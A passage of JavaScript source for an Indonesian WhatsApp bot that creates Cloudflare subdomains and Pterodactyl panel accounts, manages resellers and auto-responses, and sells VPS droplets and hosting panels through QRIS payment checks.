if (isNaN(args[0])) return ReplyLanz("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return ReplyLanz("Domain tidak ditemukan!")
if (!args[1].split("|")) return ReplyLanz("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await ReplyLanz(teks)
} else return ReplyLanz(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "createadmin": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyLanz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyLanz("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Putzz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin-v2": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyLanz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyLanz("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Putzz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("cmd|responnya"))
if (!text.split("|")) return ReplyLanz(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return ReplyLanz(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return ReplyLanz("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
ReplyLanz(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break
case 'antitoxic':
  if (!m.isGroup) return ReplyLanz('Fitur ini hanya untuk grup!')
  if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
  if (args[0] === 'on') {
    antitoxic[m.chat] = { active: true, warnings: {} }
    saveAntiToxic()
    ReplyLanz('✅ AntiToxic AKTIF di grup ini.')
  } else if (args[0] === 'off') {
    delete antitoxic[m.chat]
    saveAntiToxic()
    ReplyLanz('❌ AntiToxic NONAKTIF.')
  } else {
    ReplyLanz('Gunakan: .antitoxic on / .antitoxic off')
  }
  break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return ReplyLanz("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
ReplyLanz(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return ReplyLanz(mess.owner)
if (list.length < 1) return ReplyLanz("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
ReplyLanz(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addseller": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text && !m.quoted) return ReplyLanz(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return ReplyLanz(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/userVip/premium.json", JSON.stringify(premium, null, 2))
ReplyLanz(`Berhasil menambah reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listseller": {
if (premium.length < 1) return ReplyLanz("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Putzz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delseller": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!m.quoted && !text) return ReplyLanz(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return ReplyLanz(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return ReplyLanz(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/userVip/premium.json", JSON.stringify(premium, null, 2))
ReplyLanz(`Berhasil menghapus reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/*
case "buyscript": case "buysc": {
if (m.isGroup) return ReplyLanz("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ReplyLanz("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Botz V5', 
                  description: "Rp55.000", 
                  id: '.buysc 1'
                },
                {
                  title: 'Simple Botz V4', 
                  description: "Rp35.000", 
                  id: '.buysc 2'
                },
                {
                  title: 'Pushkontak Simpel', 
                  description: "Rp20.000", 
                  id: '.buysc 3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "55000"
    Obj.namaSc = "Script Simple Botz V5"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Botz V4"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await Putzz.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break
*/
case "buyvps": {
if (m.isGroup) return ReplyLanz("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ReplyLanz("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return ReplyLanz(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await ReplyLanz(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Putzz.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        ReplyLanz(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "nopebg": {
    let teks = `
*ALL PAYMENT NOPE*
`
    let msgii = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessageV2Extension: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'test', 
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: `{"display_text":"📋 Copy nomor Gopay","id":"copy_gopay","copy_code":"${global.gopay}"}`
                                },
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: `{"display_text":"📋 Copy nomor Shopee","id":"copy_shopee","copy_code":"${global.shopee}"}`
                                },
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: `{"display_text":"📋 Copy nomor Dana","id":"copy_dana","copy_code":"${global.dana}"}`
                                }
                            ]
                        })
                    })
                }
            }
        },
        { userJid: m.sender, quoted: qtext2 }
    )

    await Putzz.relayMessage(m.chat, msgii.message, {
        messageId: msgii.key.id
    })
}
break
/*
 "nopebg2": {
let teks = `
*ALL PAYMENT NOPE*
`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: caption
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: false
 }),
 nativeFlowMessage:
 proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{"display_text":"📋Copy nomor Dana","id":"copy_dana","copy_code":"${global.gopay}"}`
 })
 },
 {
"name": "cta_copy",
"buttonParamsJson": `{"display_text":"📋Copy nomor Dana","id":"copy_dana","copy_code":"${global.shopee}"}`
 })
 },
 {
"name": "cta_copy",
"buttonParamsJson": `{"display_text":"📋Copy nomor Dana","id":"copy_dana","copy_code":"${global.dana}"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2})
await Putzz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break*/

case "buypanel": {
if (m.isGroup) return ReplyLanz("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ReplyLanz("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp13.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp2000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp3000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp4000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp5000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp6000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp7000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp8000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp9000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp10000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp11.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1024"
Obj.disk = "1024"
Obj.cpu = "30"
Obj.harga = "2000"
} else if (cmd == "2gb") {
Obj.ram = "2048"
Obj.disk = "2048"
Obj.cpu = "50"
Obj.harga = "3000"
} else if (cmd == "3gb") {
Obj.ram = "3072"
Obj.disk = "3072"
Obj.cpu = "70"
Obj.harga = "4000"
} else if (cmd == "4gb") {
Obj.ram = "4048"
Obj.disk = "4048"
Obj.cpu = "90"
Obj.harga = "5000"
} else if (cmd == "5gb") {
Obj.ram = "5120"
Obj.disk = "5120"
Obj.cpu = "110"
Obj.harga = "6000"
} else if (cmd == "6gb") {
Obj.ram = "6144"
Obj.disk = "6144"
Obj.cpu = "125"
Obj.harga = "7000"
} else if (cmd == "7gb") {
Obj.ram = "7168"
Obj.disk = "7168"
Obj.cpu = "150"
Obj.harga = "8000"
} else if (cmd == "8gb") {
Obj.ram = "8192"
Obj.disk = "8192"
Obj.cpu = "170"
Obj.harga = "9000"
} else if (cmd == "9gb") {
Obj.ram = "9216"
Obj.disk = "9216"
Obj.cpu = "180"
Obj.harga = "10000"
} else if (cmd == "10gb") {
Obj.ram = "10240"
Obj.disk = "10240"
Obj.cpu = "200"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "13000"
} else return ReplyLanz(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyLanz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyLanz(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
